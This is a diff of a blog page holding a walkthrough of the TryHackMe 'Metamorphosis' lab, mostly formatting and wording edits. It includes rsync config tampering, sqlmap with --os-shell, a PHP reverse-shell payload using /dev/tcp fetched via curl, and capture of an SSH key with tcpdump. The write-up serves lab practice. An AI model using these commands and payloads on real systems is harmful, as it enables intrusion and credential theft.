@@ -108,6 +108,10 @@
                     </li>
                     
                         
+                        <li>
+                            <a href="/categories/blog">blog</a>
+                        </li>
+                        
                     
                     
 		    
@@ -156,7 +160,7 @@
 
 <style type="text/css">
     header.intro-header {
-        background-image: url('/images/main_go_wideandtall_darklayer.jpeg')
+        background-image: url('/images/github-pagesLightBlue.jpeg')
     }
 </style>
 <header class="intro-header">
@@ -165,6 +169,18 @@
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="post-heading">
                     <div class="tags">
+                        
+                        <a class="tag" href="/tags/blog" title="blog">
+                            blog
+                        </a>
+                        
+                        <a class="tag" href="/tags/github-pages" title="GitHub Pages">
+                            GitHub Pages
+                        </a>
+                        
+                        <a class="tag" href="/tags/hugo" title="Hugo">
+                            Hugo
+                        </a>
                         
                     </div>
                     <h1>Tryhackme Metamorphosis</h1>
@@ -211,9 +227,9 @@
         <li><a href="#nmap">Nmap</a></li>
         <li><a href="#gobuster">Gobuster</a></li>
         <li><a href="#visting-webpage">Visting Webpage</a></li>
-        <li><a href="#rsync-enumeration">Rsync Enumeration</a></li>
       </ul>
     </li>
+    <li><a href="#rsync-enumeration">Rsync Enumeration</a></li>
     <li><a href="#sqlmap">SQLmap</a></li>
     <li><a href="#getting-reverse-shell">Getting Reverse Shell</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
@@ -221,7 +237,7 @@
 </nav>
                 
                 <h2 id="overview">Overview</h2>
-<p><img style="border:2px solid black" src="/images/metamorphosis.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/metamorphosis.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <h2 id="recon">Recon</h2>
 <h3 id="nmap">Nmap</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
@@ -291,13 +307,11 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 Progress: <span style="color:#ae81ff">56672</span> / <span style="color:#ae81ff">882244</span> <span style="color:#f92672">(</span>6.42%<span style="color:#f92672">)</span>               
 
 </code></pre></div><h3 id="visting-webpage">Visting Webpage</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.97.133/admin
-
-</code></pre></div><p><img style="border:2px solid black" src="/images/forbidden.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/forbidden.png" align="left"><br><br><br><br><br><br><br></p>
 <p>Viewing <code>source code</code></p>
-<p><img style="border:2px solid black" src="/images/sourcecode.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
-<h3 id="rsync-enumeration">Rsync Enumeration</h3>
-<p>We have port 873 running which is <code>Rsync</code> you can read more about this here<a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync">hacktricks.xyz/pentesting/873-pentesting-rsync</a></p>
+<p><img style="border:2px solid black" src="/images/sourcecode.png" align="left"><br><br><br><br></p>
+<h2 id="rsync-enumeration">Rsync Enumeration</h2>
+<p>We have port 873 running which is <code>Rsync</code> you can read more about this here <a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync">hacktricks.xyz/pentesting/873-pentesting-rsync</a></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -rdt rsync://10.10.38.244:873
 
 we get | Conf            All Confs |
@@ -332,45 +346,45 @@ password <span style="color:#f92672">=</span> theCat
 
 <span style="color:#f92672">[</span>Details<span style="color:#f92672">]</span>
 Local <span style="color:#f92672">=</span> No
-</code></pre></div><p>The env variable is set to <code>prod</code>  &hellip;. change this to <code>dev</code> (for development)and uploading back the new webapp.ini file to server.</p>
+</code></pre></div><p>The env variable is set to <code>prod</code> &hellip; change this to <code>dev</code> (for development) and upload back new <code>webapp.ini</code> file to <code>server</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  
 
 </code></pre></div><p>Going to the admin page again  <code>http://10.10.101.93/admin/</code></p>
-<p><img style="border:2px solid black" src="/images/2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br></p>
 <p>Use <code>brupsuite</code> and save the request as <code>req.txt</code> file</p>
 <h2 id="sqlmap">SQLmap</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r req.txt --level <span style="color:#ae81ff">3</span> --risk <span style="color:#ae81ff">3</span> --batch --os-shell
 
-</code></pre></div><p><img style="border:2px solid black" src="/images/sqloutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+</code></pre></div><p><img style="border:2px solid black" src="/images/sqloutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br></p>
 <h2 id="getting-reverse-shell">Getting Reverse Shell</h2>
 <p>Using curl to upload the <code>Shell.php</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/tryhackme/metamorphosis#cat shell.php
 
 &lt;?php
 exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/your IP/1234 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>;
-</code></pre></div><p>In Os-shell
-curl http://your IP/shell.php -o shell.php</p>
-<p>access the shell.php in browser using <code>http://10.10.101.93/shell.php/</code></p>
+</code></pre></div><p>In <code>Os-shell</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://your IP/shell.php -o shell.php
+</code></pre></div><p>access the shell.php in browser using <code>http://10.10.101.93/shell.php/</code></p>
 <p>and <code>nc -lnvp 1234</code> in other terminal</p>
-<p>we get the <code>Rev shell</code>.</p>
-<p><img style="border:2px solid black" src="/images/revshell.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>Get the <code>Rev shell</code> and <code>Upgrade</code>.</p>
+<p><img style="border:2px solid black" src="/images/revshell.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <p>Getting  <code>User.txt</code></p>
-<p><img style="border:2px solid black" src="/images/user_txt.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/user_txt.png" align="left"><br><br><br><br><br><br><br><br><br><br><br></p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>Running <code>linpeas</code> we get the user can run <code>Tcpdump</code></p>
+<p>Running <code>linpeas</code> we get that user can run <code>Tcpdump</code></p>
 <p>Running <code>Pspy64</code> we get</p>
-<p><img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
-<p>It shows root runnign req.sh but we can run this in terminal ..</p>
+<p><img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br></p>
+<p>It shows root run <code>req.sh</code> and 	<code>sudo -l</code> not give any information</p>
 <p>Now finally run tcpdump in one terminal and pspy64 in other &hellip; and capture the output using wget &hellip;&hellip;&hellip;&hellip;&hellip;</p>
 <p><img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <p><img style="border:2px solid black" src="/images/pspy2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
-<p>In local machine run `wget http://machine Ip/1.pcap</p>
+<p>In Attakcer Machine run <code>wget http://10.10.101.93/1.pcap</code></p>
 <p>Open 1.pcap file in <code>Wireshark</code></p>
 <p>follow tcp stream and get the SSH key</p>
-<p><img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br></p>
 <p>log in with key and get <code>root.txt</code></p>
-<p><img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 
 
                 
@@ -399,6 +413,12 @@ curl http://your IP/shell.php -o shell.php</p>
                     <hr class="hidden-sm hidden-xs">
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
                         
                         
                     </div>
